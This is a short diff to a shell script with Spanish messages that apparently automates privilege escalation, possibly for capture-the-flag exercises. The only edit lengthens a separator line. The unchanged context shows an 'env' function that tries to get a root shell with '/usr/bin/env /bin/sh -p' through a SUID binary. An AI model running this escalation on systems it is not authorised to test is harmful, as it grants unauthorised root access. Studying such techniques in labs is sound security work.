@@ -47,7 +47,7 @@ flagsearch(){
 
 env(){
     echo -e "\nIntentando ser root con env..."
-    echo -e "==============================\n"
+    echo -e "===============================\n"
     /usr/bin/env /bin/sh -p 2>/dev/null
     if [ $(id -u) -ne 0 ]; then
         echo -e "No se pudo"
